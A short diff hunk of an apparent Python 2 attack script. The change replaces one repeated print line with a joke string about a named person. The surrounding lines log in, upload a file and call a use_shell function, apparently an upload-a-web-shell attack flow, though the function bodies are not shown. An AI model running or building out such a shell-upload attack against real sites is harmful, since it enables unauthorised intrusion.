@@ -22,7 +22,7 @@ print "nihaonihaonihao"
 print "nihaonihaonihao"
 print "nihaonihaonihao"
 print "nihaonihaonihao"
-print "nihaonihaonihao"
+print "Mark wu has lots of money"
 session = requests.Session()
 login(session)
 use_shell(session,upload_file(session))
